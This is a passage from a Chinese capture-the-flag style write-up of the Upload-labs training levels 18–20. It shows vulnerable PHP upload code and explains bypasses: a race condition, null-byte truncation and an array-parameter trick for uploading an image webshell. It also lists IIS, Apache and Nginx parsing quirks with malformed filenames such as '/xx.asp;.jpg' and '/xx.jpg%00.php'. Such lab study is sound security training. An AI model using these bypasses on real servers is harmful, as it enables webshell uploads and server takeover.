class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p>
<h1 id="Pass-19-00截断POST方式"><a href="#Pass-19-00截断POST方式" class="headerlink" title="Pass-19 00截断POST方式"></a>Pass-19 00截断POST方式</h1><p>与12题同样的方式</p>
<h1 id="Pass-20-数组加-绕过"><a href="#Pass-20-数组加-绕过" class="headerlink" title="Pass-20 数组加/.绕过"></a>Pass-20 数组加/.绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先end函数取所post参数数组中的最后一个值，<strong>$file_name = reset($file) . ‘.’ . $file[count($file) - 1]</strong>我们可以post一个参数名为一个[0]一个[2]，然后$file[count($file) - 1]就为空，$file_name最终就为reset($file)即$file[0]，就可以绕过判断</p>
<p>抓包：</p>
<img src="/2019/07/31/Upload-labs/0x20-1.png" title="0x20-1">
<p>文件类型修改为图片类型：</p>
<img src="/2019/07/31/Upload-labs/0x20-2.png" title="0x20-2">
<p>漏洞利用：</p>
<img src="/2019/07/31/Upload-labs/0x20-3.png" title="0x20-3">

<img src="/2019/07/31/Upload-labs/0x20-4.png" title="0x20-4">
<p>上传成功：</p>
<img src="/2019/07/31/Upload-labs/0x20-5.jpg" title="0x20-5">


<h1 id="看了其他大佬的总结，还有其他的一些未见过的解析漏洞"><a href="#看了其他大佬的总结，还有其他的一些未见过的解析漏洞" class="headerlink" title="看了其他大佬的总结，还有其他的一些未见过的解析漏洞"></a>看了其他大佬的总结，还有其他的一些未见过的解析漏洞</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><p><strong>IIS 6.0</strong>解析利用又三种：</p>
<h3 id="1-目录解析"><a href="#1-目录解析" class="headerlink" title="1.目录解析"></a>1.目录解析</h3><p>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析</p>
<h3 id="2-文件解析"><a href="#2-文件解析" class="headerlink" title="2.文件解析"></a>2.文件解析</h3><p>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)</p>
<h3 id="3-默认解析"><a href="#3-默认解析" class="headerlink" title="3.默认解析"></a>3.默认解析</h3><p>IIS6.0 默认的可执行文件除了asp还包含这三种</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa</span><br><span class="line">/xxx.cer</span><br><span class="line">/xxx.cdx</span><br><span class="line">/xxx.apsx</span><br></pre></td></tr></table></figure>

<h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h2><p>在正常图片URL后添加 /.php，可以解析为php</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p>
<p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx &lt;8.03畸形解析漏洞<br>直接在正常图片URL后添加/.php<br>Nginx &lt;=0.8.37<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p>
<p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件</p>
]]></content>
      
        
    </entry>
    
  
  
</search>
